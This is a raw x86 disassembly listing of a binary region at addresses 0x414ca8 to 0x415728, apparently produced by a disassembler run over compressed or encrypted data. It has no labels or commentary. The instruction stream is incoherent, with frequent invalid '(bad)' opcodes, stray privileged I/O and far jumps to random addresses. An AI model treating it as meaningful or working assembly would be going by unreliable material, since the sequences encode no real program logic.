  414ca8:	inc    ebx
  414ca9:	jmp    0xf6259713
  414cae:	out    dx,eax
  414caf:	adc    ecx,DWORD PTR [esi]
  414cb1:	ret    0xedb
  414cb4:	loope  0x414d2a
  414cb6:	xor    bl,BYTE PTR [esi]
  414cb8:	mov    ds:0x1e306a71,eax
  414cbd:	jg     0x414c9f
  414cbf:	jmp    0x24f6:0x64ead727
  414cc6:	push   eax
  414cc7:	stc    
  414cc8:	cli    
  414cc9:	add    DWORD PTR [ecx+eax*2-0xb],ecx
  414ccd:	mov    cl,0x2a
  414ccf:	mov    gs,WORD PTR [edx+eax*1]
  414cd2:	retf   
  414cd3:	jne    0x414d3b
  414cd5:	outs   dx,DWORD PTR ds:[esi]
  414cd6:	aaa    
  414cd7:	mov    eax,0xe33829e3
  414cdc:	iret   
  414cdd:	adc    al,0x19
  414cdf:	fwait
  414ce0:	leave  
  414ce1:	ret    
  414ce2:	call   0x1b06:0xe1d0f3af
  414ce9:	add    eax,0xf8926cba
  414cee:	cs (bad) 
  414cf0:	pop    ds
  414cf1:	xchg   BYTE PTR ds:0xde07a93c,bh
  414cf7:	xchg   edx,eax
  414cf8:	in     al,0x4d
  414cfa:	push   es
  414cfb:	loope  0x414cf2
  414cfd:	icebp  
  414cfe:	popf   
  414cff:	bound  edx,QWORD PTR [di+0x0]
  414d03:	jecxz  0x414d75
  414d05:	arpl   WORD PTR [ecx+0x4fb8987d],ax
  414d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d0c:	pop    ebp
  414d0d:	test   eax,0x11241e51
  414d12:	fsub   QWORD PTR [ebx]
  414d14:	pop    edx
  414d15:	dec    esi
  414d16:	mov    ebx,0xeb1da4ae
  414d1b:	sbb    eax,0x9103253
  414d20:	pop    edx
  414d21:	cld    
  414d22:	leave  
  414d23:	inc    eax
  414d24:	mul    al
  414d26:	xchg   esp,eax
  414d27:	sub    ebp,esi
  414d29:	xchg   DWORD PTR [eax+0x4f],esp
  414d2c:	les    edx,FWORD PTR [ecx+esi*8+0x6996c359]
  414d33:	jmp    0x414e2b
	...
  414d94:	add    BYTE PTR [eax],al
  414d96:	mov    bh,0x99
  414d98:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414d9e:	sbb    DWORD PTR [esi+0x31151445],ebp
  414da4:	mov    edx,0xd93314
  414da9:	add    BYTE PTR [edi],al
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    BYTE PTR [esi+esi*4-0x3ec56ab4],al
  414db4:	pop    edx
  414db5:	fsubr  QWORD PTR [ebp+0x5d]
  414db8:	fsub   DWORD PTR [edi-0x7d774955]
  414dbe:	and    al,0x2b
  414dc0:	loop   0x414d99
  414dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dc3:	emms   
  414dc5:	adc    eax,0x3c86f3e4
  414dca:	in     al,0x3c
  414dcc:	cmp    BYTE PTR [ebp-0x67bad7bb],0x8f
  414dd3:	(bad)  
  414dd4:	jno    0x414e18
  414dd6:	adc    eax,0xd6d4b2e
  414ddb:	or     al,0xca
  414ddd:	cmc    
  414dde:	sbb    DWORD PTR [edi-0x20e6e776],0x5cb19ead
  414de8:	sub    cl,cl
  414dea:	call   0x56aad64e
  414def:	mov    al,ds:0x373f5a8a
  414df4:	push   ss
  414df5:	jge    0x414df3
  414df7:	std    
  414df8:	and    al,BYTE PTR fs:[edi]
  414dfb:	scas   al,BYTE PTR es:[edi]
  414dfc:	imul   ebp,edx,0x1b92caa1
  414e02:	pop    esp
  414e03:	mov    esi,0x8941ef32
  414e08:	lods   al,BYTE PTR ds:[esi]
  414e09:	fld    DWORD PTR [esi+ecx*8]
  414e0c:	repnz xor cl,BYTE PTR [edi]
  414e0f:	scas   eax,DWORD PTR es:[edi]
  414e10:	dec    ecx
  414e11:	arpl   WORD PTR [eax+0x69],sp
  414e14:	je     0x414ded
  414e16:	test   al,0x3
  414e18:	ret    
  414e19:	or     ebx,DWORD PTR [esi-0x50]
  414e1c:	mov    ds:0x1a0d6ff7,al
  414e21:	pop    ebp
  414e22:	loop   0x414dca
  414e24:	into   
  414e25:	repz adc eax,0xd52dc392
  414e2b:	inc    eax
  414e2c:	ret    
  414e2d:	inc    esi
  414e2e:	lods   al,BYTE PTR ds:[esi]
  414e2f:	push   ds
  414e30:	or     DWORD PTR ds:0x9a05c1da,0x14b6061d
  414e3a:	push   0x57
  414e3c:	sbb    ebx,ebp
  414e3e:	and    al,0x49
  414e40:	sub    eax,0x223b0e4a
  414e45:	sub    ebp,DWORD PTR [edi+0x1b]
  414e48:	sbb    eax,0x557480db
  414e4d:	or     al,0x30
  414e4f:	jns    0x414ec3
  414e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e52:	adc    eax,ebx
  414e54:	mov    esp,0x16d2d6b3
  414e59:	mov    dl,BYTE PTR [esi+0x7b4843d3]
  414e5f:	in     eax,dx
  414e60:	fisub  WORD PTR [ecx-0x6b33422c]
  414e66:	mov    cl,0x95
  414e68:	xchg   dl,bh
  414e6a:	in     eax,dx
  414e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e6c:	inc    ebx
  414e6d:	pop    esp
  414e6e:	mov    DWORD PTR [edi-0x4ff4c38a],esi
  414e74:	or     cl,al
  414e76:	sbb    al,0x4e
  414e79:	(bad)  
  414e7a:	repnz inc ebp
  414e7c:	jle    0x414e71
  414e7e:	lods   al,BYTE PTR ds:[esi]
  414e7f:	test   BYTE PTR [ecx],bl
  414e81:	dec    eax
  414e82:	xor    eax,0xaa1d7b50
  414e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e88:	in     al,dx
  414e89:	es xchg ebp,eax
  414e8b:	xchg   esi,eax
  414e8c:	fs repz xor esp,0xffffffda
  414e91:	test   BYTE PTR [ebp+0x2a4c1452],ah
  414e97:	xchg   edi,eax
  414e98:	xchg   edi,eax
  414e99:	adc    BYTE PTR [edx+ebp*2-0x13ed565e],0x76
  414ea1:	xchg   DWORD PTR [ebx+edx*2],ecx
  414ea4:	imul   edi,DWORD PTR [ebx+0x8d55a0c],0xffffff9b
  414eab:	(bad)  [edi-0x642191c7]
  414eb1:	and    eax,0xdb244f
	...
  414f16:	aaa    
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	aas    
  414f23:	xchg   DWORD PTR [ebx+edi*8+0xda3a],esp
  414f2a:	pop    es
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    BYTE PTR [edi],al
  414f2f:	xor    eax,0x916acacc
  414f34:	icebp  
  414f35:	enter  0xb128,0xd1
  414f39:	push   ss
  414f3a:	fldenv [ebx]
  414f3c:	xchg   edi,eax
  414f3d:	ret    0xfaa8
  414f40:	push   edx
  414f41:	in     eax,0x3b
  414f43:	cld    
  414f44:	call   0xead76091
  414f49:	cmp    ah,BYTE PTR [edi-0x66bb95d0]
  414f4f:	inc    edi
  414f50:	in     eax,dx
  414f51:	cmp    BYTE PTR [esi+edi*8+0x4b],dh
  414f55:	xor    ecx,esi
  414f57:	adc    al,0x65
  414f59:	mov    bl,0x68
  414f5b:	xchg   esi,eax
  414f5c:	mov    ch,0xb5
  414f5e:	les    ebx,FWORD PTR [edi+ebp*1+0x6f]
  414f62:	or     bh,dh
  414f64:	retf   0x8691
  414f67:	mov    ch,0x9b
  414f69:	stos   DWORD PTR es:[edi],eax
  414f6a:	outs   dx,BYTE PTR ds:[esi]
  414f6b:	push   edi
  414f6c:	mov    bl,0x58
  414f6e:	cmp    dl,dl
  414f70:	jmp    0x8cdd:0xb23cbc69
  414f77:	daa    
  414f78:	pop    edi
  414f79:	jbe    0x414f95
  414f7b:	or     ah,BYTE PTR [ebx+ebx*8+0x3e69d58f]
  414f82:	mov    edx,0x998b3bc5
  414f87:	pushf  
  414f88:	(bad)  
  414f89:	aad    0x1f
  414f8b:	mov    bl,0x3
  414f8d:	ss sti 
  414f8f:	popa   
  414f90:	mov    eax,0xdaec05ee
  414f95:	jp     0x414ff4
  414f97:	pop    edi
  414f98:	mov    esi,0x7b1cc57b
  414f9d:	or     al,0x81
  414f9f:	xchg   esi,eax
  414fa0:	or     DWORD PTR cs:[ebx+edi*4-0x75],ebx
  414fa5:	aaa    
  414fa6:	mov    cl,0xf
  414fa8:	adc    ch,BYTE PTR cs:[ebx]
  414fab:	mov    ds:0xd954baf4,al
  414fb0:	loope  0x414ff6
  414fb2:	into   
  414fb3:	sbb    ebp,DWORD PTR [esi+0xdc01c6e]
  414fb9:	loope  0x414f6d
  414fbb:	sub    cl,0x49
  414fbe:	fldenv [edx-0x31]
  414fc1:	nop
  414fc2:	or     ch,BYTE PTR [ecx-0x36]
  414fc5:	xor    BYTE PTR [edx+0xd313c40],dh
  414fcb:	popa   
  414fcc:	div    BYTE PTR [eax+0x2d]
  414fcf:	cwde   
  414fd0:	cld    
  414fd1:	adc    al,0x19
  414fd3:	imul   DWORD PTR [edx+ebp*1-0xd]
  414fd7:	sub    bh,ah
  414fd9:	cmp    DWORD PTR [edi],edx
  414fdb:	scas   eax,DWORD PTR es:[edi]
  414fdc:	in     eax,dx
  414fdd:	cmp    BYTE PTR [ebx+0x479cab80],bh
  414fe3:	data16 adc ch,BYTE PTR [ecx]
  414fe6:	stc    
  414fe7:	add    eax,eax
  414fe9:	sbb    ax,0x31d5
  414fed:	jmp    0x2d4486c4
  414ff2:	xchg   esp,ebp
  414ff4:	sub    BYTE PTR [eax],bh
  414ff6:	pop    edx
  414ff7:	mov    WORD PTR [ebx-0x1a7faef],?
  414ffd:	mov    eax,0xbde5228b
  415002:	rol    BYTE PTR [ebp+0x30],cl
  415005:	sti    
  415006:	add    BYTE PTR [ecx],dl
  415008:	std    
  415009:	cmp    al,0xbe
  41500b:	dec    ebx
  41500c:	(bad)  
  41500e:	mov    esp,0xcfe54877
  415013:	dec    edx
  415014:	sub    edx,eax
  415016:	mov    ebp,DWORD PTR [ebp+0x6da54dcb]
  41501c:	add    ebx,ebx
  41501e:	imul   ebp,DWORD PTR [edi],0x90da6d34
  415024:	in     eax,dx
  415025:	xchg   BYTE PTR [edx],bh
  415027:	push   edi
  415028:	pop    esi
  415029:	mov    edx,0xc97d74cf
  41502e:	in     eax,0xe7
  415030:	cs test edx,esp
  415033:	fstp   TBYTE PTR [edi+0x0]
	...
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0xe538850c
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR [esi-0x652407a7],al
  4150b3:	out    0xfa,al
  4150b5:	(bad)  
  4150b6:	cdq    
  4150b7:	fcmovnb st,st(2)
  4150b9:	pop    edi
  4150ba:	push   0x6fba6311
  4150bf:	aad    0xe7
  4150c1:	outs   dx,BYTE PTR ds:[esi]
  4150c2:	pop    ecx
  4150c3:	in     al,0x1d
  4150c5:	jmp    0x4420:0xa9b1c1f5
  4150cc:	ret    
  4150cd:	jne    0x415099
  4150cf:	icebp  
  4150d0:	push   cs
  4150d1:	add    ebp,esi
  4150d3:	int3   
  4150d4:	into   
  4150d5:	test   dl,0x3
  4150d8:	(bad)  
  4150d9:	shl    esp,cl
  4150db:	inc    ebx
  4150dc:	lea    edi,[ebp-0x6084e285]
  4150e2:	pop    ss
  4150e3:	pop    eax
  4150e4:	daa    
  4150e5:	test   al,0x41
  4150e7:	cmc    
  4150e8:	sbb    al,0xff
  4150ea:	imul   ebp,ecx,0x54
  4150ed:	test   eax,0xb81d8c04
  4150f2:	dec    edi
  4150f3:	xor    eax,ebp
  4150f5:	dec    ecx
  4150f6:	jecxz  0x415127
  4150f8:	mov    ecx,0xdaca0b
  4150fd:	dec    eax
  4150fe:	xchg   BYTE PTR [eax+0x29],dl
  415101:	into   
  415102:	cmc    
  415103:	pop    edx
  415104:	push   eax
  415105:	sti    
  415106:	and    edi,DWORD PTR [esp+eax*4]
  415109:	ins    DWORD PTR es:[edi],dx
  41510a:	test   BYTE PTR [edx+0x5a66533e],bh
  415110:	cmc    
  415111:	sbb    ch,BYTE PTR [ebx-0x6eb20936]
  415117:	cmp    al,0xb6
  415119:	inc    edi
  41511a:	mov    ds:0x64afecfb,al
  41511f:	(bad)  
  415120:	push   es
  415121:	add    bl,0xde
  415124:	xor    al,0xc8
  415126:	cld    
  415127:	adc    al,0xbc
  415129:	xor    esi,eax
  41512b:	stc    
  41512c:	push   ebp
  41512d:	pop    edi
  41512e:	dec    ebx
  41512f:	test   al,0x6c
  415131:	xlat   BYTE PTR ds:[ebx]
  415132:	push   ds
  415133:	stc    
  415134:	cmp    ecx,ecx
  415136:	pop    eax
  415137:	push   cs
  415138:	icebp  
  415139:	rcl    DWORD PTR [ebx],0x63
  41513c:	(bad)  
  41513d:	in     al,0x88
  41513f:	pop    esi
  415140:	adc    bl,BYTE PTR [edx]
  415142:	fdivr  QWORD PTR [ebp+0x75]
  415145:	mov    fs,WORD PTR [edx-0x7574b488]
  41514b:	jmp    0x8dfe486b
  415150:	mov    esi,0x522a13c6
  415155:	xor    bh,BYTE PTR [edi-0x52]
  415158:	jl     0x415149
  41515a:	icebp  
  41515b:	lds    edx,FWORD PTR [ebx-0x75c9ea2b]
  415161:	jl     0x4151cb
  415163:	xor    BYTE PTR [eax+0x49],dl
  415166:	cmp    eax,DWORD PTR [ebx-0x1604b70d]
  41516c:	or     DWORD PTR [eax],esp
  41516e:	xor    edi,ecx
  415170:	adc    eax,0x24ee9d67
  415175:	xchg   ebp,eax
  415176:	push   0x6a69d2d0
  41517b:	mov    eax,ds:0x6c40cc64
  415180:	(bad)  
  415181:	out    0x78,eax
  415183:	mov    ebx,0x12c7baba
  415188:	pop    ebx
  415189:	dec    DWORD PTR [edi+eiz*4]
  41518c:	nop
  41518d:	xor    bh,BYTE PTR [esi-0x1c]
  415190:	lods   al,BYTE PTR ds:[esi]
  415191:	mov    esp,0xba6b0a24
  415196:	je     0x415187
  415198:	sbb    al,0xf
  41519a:	pop    edi
  41519b:	fisubr DWORD PTR cs:[ecx+0x3d]
  41519f:	dec    esi
  4151a0:	inc    esp
  4151a2:	xchg   BYTE PTR [ebx-0x35],ch
  4151a5:	adc    al,0xc4
  4151a7:	icebp  
  4151a8:	inc    ebx
  4151a9:	aas    
  4151aa:	cmp    al,0x1a
  4151ac:	leave  
  4151ad:	in     al,dx
  4151ae:	sti    
  4151af:	push   es
  4151b0:	ds pop edx
  4151b2:	and    ebp,DWORD PTR [eax-0x3]
	...
  415215:	add    BYTE PTR [edi+edx*4],ch
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0xcd
  415223:	cmp    eax,0xdc48dfb8
  415228:	add    BYTE PTR [eax],al
  41522a:	pop    es
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    BYTE PTR [esi+ebp*1],ah
  415230:	fnstcw WORD PTR [ecx+0x7e0261f3]
  415236:	test   DWORD PTR ds:0x2cd5b7c3,ebp
  41523c:	mov    esp,0x5da8c17d
  415241:	out    0x6f,al
  415243:	out    dx,al
  415244:	test   eax,0xa558f908
  415249:	prefetch (bad)
  41524a:	or     eax,0x12949be0
  41524f:	xor    DWORD PTR [ebx],0xffffff9f
  415252:	dec    ebp
  415253:	jge    0x4151ee
  415255:	int    0xcd
  415257:	adc    bl,BYTE PTR [ebx+0x7542ed7a]
  41525d:	mul    DWORD PTR [ecx-0x1fa10ce7]
  415263:	and    ch,dl
  415265:	ds (bad) 
  415267:	mov    ebp,0x1e81b072
  41526c:	or     al,0x60
  41526e:	add    al,0xa6
  415270:	(bad)  
  415271:	popa   
  415272:	and    al,0x2f
  415274:	dec    esp
  415275:	push   edx
  415276:	call   0xa6dd:0x3aa0235d
  41527d:	xor    al,BYTE PTR ds:0xbd5ad306
  415283:	push   edi
  415284:	adc    DWORD PTR [eax],eax
  415286:	cld    
  415287:	mov    dh,0x6e
  415289:	fnsave [ecx+0x1fa19366]
  41528f:	outs   dx,BYTE PTR ds:[esi]
  415290:	or     DWORD PTR [esp+edx*1-0x21],esp
  415294:	pop    ss
  415295:	scas   al,BYTE PTR es:[edi]
  415296:	xchg   edx,eax
  415297:	jmp    0x41523c
  415299:	loope  0x4152dd
  41529b:	je     0x415285
  41529d:	mov    dl,0xfa
  41529f:	(bad)  
  4152a0:	outs   dx,BYTE PTR ds:[esi]
  4152a1:	in     eax,dx
  4152a2:	jg     0x41527a
  4152a4:	dec    ebx
  4152a5:	outs   dx,DWORD PTR ds:[esi]
  4152a6:	stos   DWORD PTR es:[edi],eax
  4152a7:	int    0x8f
  4152a9:	adc    ah,ch
  4152ab:	xor    al,0x4f
  4152ad:	mov    dh,0xb1
  4152af:	add    BYTE PTR [edi+0x21f31177],al
  4152b5:	in     eax,0xff
  4152b7:	xchg   eax,eax
  4152b9:	sub    al,0x5e
  4152bb:	clc    
  4152bc:	inc    eax
  4152bd:	xchg   edx,eax
  4152be:	in     al,0x4
  4152c0:	push   ss
  4152c1:	jmp    0x8a21ae57
  4152c6:	imul   ebx,DWORD PTR [edi+0x685f0168],0x6e
  4152cd:	arpl   WORD PTR [edx+0x7162414e],di
  4152d3:	dec    DWORD PTR [edx-0x1f5fd6a8]
  4152d9:	pop    ds
  4152da:	imul   ebx,ecx,0x6b
  4152dd:	shr    bl,1
  4152df:	iret   
  4152e0:	ret    0xfb2e
  4152e3:	adc    BYTE PTR [ebx],al
  4152e5:	push   eax
  4152e6:	sub    bl,BYTE PTR [edi]
  4152e8:	mov    WORD PTR [esi+0x72],cs
  4152eb:	mov    ?,WORD PTR [edi-0x3c]
  4152ee:	inc    eax
  4152ef:	ss or  al,0x44
  4152f2:	sar    DWORD PTR [ebx+0x4be49bd5],cl
  4152f8:	nop
  4152f9:	jle    0x41534c
  4152fb:	push   eax
  4152fc:	scas   eax,DWORD PTR es:[edi]
  4152fd:	pop    ss
  4152fe:	lock out dx,al
  415300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415301:	loop   0x4152dc
  415303:	xlat   BYTE PTR ds:[ebx]
  415304:	cwde   
  415305:	xchg   DWORD PTR [ebx-0x1fed6ddb],esi
  41530b:	push   ebx
  41530c:	mov    edi,0x886fb891
  415311:	sbb    al,0x8d
  415313:	int    0xf8
  415315:	mul    BYTE PTR [edx+0x6a]
  415318:	xchg   edx,eax
  415319:	adc    bl,dl
  41531b:	mov    ebx,0xdd4b9410
  415320:	xchg   ebx,eax
  415321:	repnz call 0xbebd:0xac60d14e
  415329:	pop    ss
  41532a:	in     al,dx
  41532b:	stos   DWORD PTR es:[edi],eax
  41532c:	or     BYTE PTR [edi-0x587b9d11],ch
  415332:	inc    edi
  415333:	jno    0x415375
	...
  415395:	add    BYTE PTR [ebp-0x10],ch
  415398:	repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0xec4b9b2a
  4153a3:	push   eax
  4153a4:	pop    esi
  4153a5:	push   ebx
  4153a6:	dec    edi
  4153a7:	fld    QWORD PTR [eax]
  4153a9:	add    BYTE PTR [edi],al
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [ebx+ebx*8-0x2edbc228],bl
  4153b4:	aad    0xae
  4153b6:	and    BYTE PTR [edi-0x775c8340],dl
  4153bc:	mov    ebx,0x36481f47
  4153c1:	out    0xc0,eax
  4153c3:	mov    eax,ds:0xd780f97d
  4153c8:	aaa    
  4153c9:	lds    esi,FWORD PTR [ebp+0xf9a2a1c]
  4153cf:	test   BYTE PTR [ecx+0x66f907b],0xd6
  4153d6:	adc    ch,BYTE PTR [ebx+0x2d7ee1ed]
  4153dc:	gs xchg esp,eax
  4153de:	and    esi,DWORD PTR [edx-0x566ce11f]
  4153e4:	mov    BYTE PTR [ebx],cl
  4153e6:	sub    eax,0x4895174d
  4153eb:	jle    0x41544e
  4153ed:	xor    bh,BYTE PTR [esp+ebp*4-0x5d63717a]
  4153f4:	aas    
  4153f5:	sbb    eax,0x1d498f09
  4153fa:	xlat   BYTE PTR ds:[ebx]
  4153fb:	(bad)  
  4153fc:	cmp    BYTE PTR [ecx],bh
  4153fe:	out    dx,al
  4153ff:	mov    ds,WORD PTR [esi]
  415401:	es jbe 0x4153da
  415404:	and    al,0xb8
  415406:	rcr    DWORD PTR [ecx+0x43b2c58e],0xb1
  41540d:	sbb    ah,ch
  41540f:	cmp    BYTE PTR [eax+0x3ece3c44],bl
  415415:	mov    bh,0x47
  415417:	fchs   
  415419:	lock or cl,BYTE PTR [eax-0x2c944a17]
  415420:	aam    0xb3
  415422:	loope  0x4153ef
  415424:	push   cs
  415425:	pop    es
  415426:	imul   esi,DWORD PTR [esi],0xffffffb3
  415429:	cmp    ebx,ebx
  41542b:	sub    dl,bh
  41542d:	(bad)  
  41542e:	es aam 0xfc
  415431:	and    al,0x8f
  415433:	ret    
  415434:	gs xchg edx,eax
  415436:	retf   0x791b
  415439:	dec    ebx
  41543a:	sbb    al,0x3a
  41543c:	loopne 0x4153c4
  41543e:	fs jo  0x415476
  415441:	rcr    BYTE PTR [edx+0x3ef1bb97],1
  415447:	nop
  415448:	iret   
  415449:	inc    dh
  41544b:	out    dx,eax
  41544c:	bound  ebp,QWORD PTR [edi+0x1e]
  41544f:	out    dx,eax
  415450:	or     al,0x6
  415452:	jmp    0x37991a52
  415457:	stos   BYTE PTR es:[edi],al
  415458:	push   esp
  415459:	add    DWORD PTR [edx+0xc83a063],ebp
  41545f:	outs   dx,DWORD PTR ds:[esi]
  415460:	loopne 0x41546d
  415462:	pop    ecx
  415463:	call   0xb8da:0xbafa6ea1
  41546a:	enter  0xe373,0xf7
  41546e:	add    DWORD PTR [ecx-0x49],edi
  415471:	aam    0x2b
  415473:	ret    0xd12b
  415476:	jnp    0x415480
  415478:	stos   BYTE PTR es:[edi],al
  415479:	test   eax,0x8c8ccc5
  41547e:	shl    ebp,cl
  415480:	mov    ah,0xff
  415482:	sub    BYTE PTR ds:0x10e14533,bl
  415488:	ja     0x4154a0
  41548a:	mov    ebx,0xe5fe1c55
  41548f:	jnp    0x4154a2
  415491:	cmc    
  415492:	arpl   bx,ax
  415494:	sti    
  415495:	aam    0xe3
  415497:	idiv   BYTE PTR [edx]
  415499:	test   eax,0xd11a5cb8
  41549e:	sub    ebp,ecx
  4154a0:	jl     0x4154f3
  4154a2:	and    eax,0x7fe2ecee
  4154a7:	dec    ebp
  4154a8:	add    BYTE PTR [edx-0x7e],0x5b
  4154ac:	mov    eax,eax
  4154ae:	imul   bl
  4154b0:	push   ds
  4154b1:	das    
  4154b2:	mov    edx,0x4d7e
	...
  415513:	add    BYTE PTR [eax],al
  415515:	add    ah,ah
  415517:	lock sub DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	sub    BYTE PTR [esi-0x21a94375],bh
  415528:	add    BYTE PTR [eax],al
  41552a:	pop    es
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [eax],dl
  41552f:	mov    ah,0x0
  415531:	add    al,0xc0
  415533:	or     edi,DWORD PTR [edi-0x162dca19]
  415539:	sti    
  41553a:	and    al,0x30
  41553c:	push   esp
  41553d:	mov    edx,0x76ccf2a
  415542:	jp     0x415522
  415544:	inc    ebx
  415545:	lar    edx,di
  415548:	push   esi
  415549:	lahf   
  41554a:	add    edx,esi
  41554c:	mov    ebx,0x3d5d7c1c
  415551:	int3   
  415552:	add    DWORD PTR [esi+edx*2-0x3f0d496d],esp
  415559:	push   ebp
  41555a:	jb     0x41553c
  41555c:	test   eax,0xc0ca999a
  415561:	xchg   esp,eax
  415562:	sbb    eax,0x9a3880da
  415567:	jmp    0x415517
  415569:	pop    ebp
  41556a:	sub    DWORD PTR cs:[eax+eiz*2-0x78],edi
  41556f:	lea    esp,[edi-0x2c]
  415572:	icebp  
  415573:	div    BYTE PTR [edx-0x1b]
  415576:	cwde   
  415577:	push   edx
  415578:	mov    eax,0x33008d1d
  41557d:	sbb    BYTE PTR [eax+0x5dd04f8c],cl
  415583:	push   0x74
  415585:	xchg   ebp,eax
  415586:	ret    
  415587:	clc    
  415588:	cmc    
  415589:	xor    BYTE PTR [ecx],bh
  41558b:	and    al,0x20
  41558d:	xor    al,0x14
  41558f:	rcl    dh,0xb5
  415592:	sbb    eax,0x6a6de9e8
  415597:	inc    ecx
  415598:	mov    ch,0x60
  41559a:	pop    edi
  41559b:	dec    edi
  41559c:	retf   0x77a4
  41559f:	jmp    0xcb13c7b
  4155a4:	dec    edx
  4155a5:	jge    0x4155d4
  4155a7:	(bad)  
  4155a8:	mov    edx,0x5b77bac5
  4155ad:	sahf   
  4155ae:	xor    DWORD PTR [ebp+0x27],esi
  4155b1:	lea    ebx,[eax]
  4155b3:	mov    dh,dh
  4155b5:	inc    ebp
  4155b6:	mov    ah,BYTE PTR [ecx]
  4155b8:	jmp    DWORD PTR [edx-0x5e2f4e9e]
  4155be:	out    0xb1,al
  4155c0:	adc    eax,0x90b3432d
  4155c5:	adc    ebp,esi
  4155c7:	adc    esp,DWORD PTR [eax-0xa]
  4155ca:	icebp  
  4155cb:	xlat   BYTE PTR ds:[ebx]
  4155cc:	jle    0x415598
  4155ce:	pop    esi
  4155cf:	sub    al,0x12
  4155d1:	aam    0xa0
  4155d3:	out    dx,al
  4155d4:	mov    edx,edi
  4155d6:	adc    esi,DWORD PTR [eax-0x77f9269d]
  4155dc:	fadd   QWORD PTR [esi]
  4155de:	dec    esp
  4155df:	and    esp,ecx
  4155e1:	daa    
  4155e2:	sahf   
  4155e3:	fsub   DWORD PTR [edi+ebp*8+0x62686094]
  4155ea:	mov    al,ds:0x5da0696b
  4155ef:	push   eax
  4155f0:	mov    eax,0x2c3fdaaa
  4155f5:	enter  0xa94c,0x33
  4155f9:	dec    esp
  4155fa:	dec    esi
  4155fb:	call   0x92c3:0xbda06dae
  415602:	(bad)  
  415604:	popa   
  415605:	les    eax,FWORD PTR [ebx+0x6c]
  415608:	(bad)  
  415609:	std    
  41560a:	(bad)  
  41560c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41560d:	stos   DWORD PTR es:[edi],eax
  41560e:	imul   cl
  415610:	lahf   
  415611:	pop    esi
  415612:	call   0xd47c:0x80473a51
  415619:	aaa    
  41561a:	dec    ecx
  41561b:	xchg   ebp,eax
  41561c:	sub    al,0xdc
  41561e:	cmp    al,BYTE PTR [eax+0x56]
  415621:	int3   
  415622:	jp     0x41563f
  415624:	retf   
  415625:	in     eax,dx
  415626:	call   DWORD PTR [ebx]
  415628:	aaa    
  415629:	sar    BYTE PTR [esi+0x7b],cl
  41562c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41562d:	sub    BYTE PTR [ebp+0x33],ch
  415630:	adc    DWORD PTR [ecx+ecx*8],esp
  415633:	sahf   
  415634:	mov    al,ds:0x0
	...
  415695:	add    BYTE PTR [ebp-0x66],ch
  415698:	mov    esp,0xfd67ff45
  41569d:	mov    edx,0xaffd40cb
  4156a2:	pop    ebp
  4156a3:	mov    dh,0xe
  4156a5:	push   edx
  4156a6:	pop    ebp
  4156a7:	fild   WORD PTR [eax]
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    BYTE PTR [ebp+0x7c009bf2],bl
  4156b3:	fsub   DWORD PTR [eax]
  4156b5:	inc    ebx
  4156b6:	arpl   WORD PTR [ebx-0x39],si
  4156b9:	push   edx
  4156ba:	sub    eax,0x27577dd
  4156bf:	sbb    BYTE PTR [esi+0x5828d8b7],0x84
  4156c6:	mov    ecx,0xaaadf6a
  4156cb:	int    0xb5
  4156cd:	inc    eax
  4156ce:	and    DWORD PTR [eax+0x14],edx
  4156d1:	dec    ebx
  4156d2:	mov    esp,0x86f982e2
  4156d7:	push   0xcc14fc14
  4156dc:	dec    ebx
  4156dd:	fistp  WORD PTR [edi+0x22]
  4156e0:	sub    ch,BYTE PTR [ebx-0x3ea6686]
  4156e6:	sub    BYTE PTR [edx],al
  4156e8:	loope  0x41568c
  4156ea:	imul   edi,DWORD PTR [ebp-0x29],0x74
  4156ee:	in     al,dx
  4156ef:	in     eax,dx
  4156f0:	shl    BYTE PTR [esi+0x73],cl
  4156f3:	retf   
  4156f4:	inc    esi
  4156f5:	pop    ebx
  4156f6:	daa    
  4156f7:	das    
  4156f8:	out    dx,eax
  4156f9:	fstp   DWORD PTR [ecx]
  4156fb:	pusha  
  4156fc:	xchg   esi,eax
  4156fd:	scas   al,BYTE PTR es:[edi]
  4156fe:	into   
  4156ff:	jne    0x415734
  415701:	ja     0x4156ca
  415703:	mov    ch,0x6
  415705:	xchg   edi,eax
  415706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415707:	push   cs
  415708:	ror    BYTE PTR [esi+0x6856cf31],1
  41570e:	in     al,dx
  41570f:	dec    eax
  415710:	in     eax,0xf8
  415712:	addr16 popf 
  415714:	jae    0x41578b
  415716:	nop
  415717:	rcl    BYTE PTR [ebx-0x1d75206e],cl
  41571d:	ds hlt 
  41571f:	mov    bl,0x8
  415721:	es inc edx
  415723:	dec    eax
  415724:	xchg   edi,eax
  415725:	mov    dh,0xd
  415727:	xlat   BYTE PTR ds:[ebx]
  415728:	sub    eax,ebx
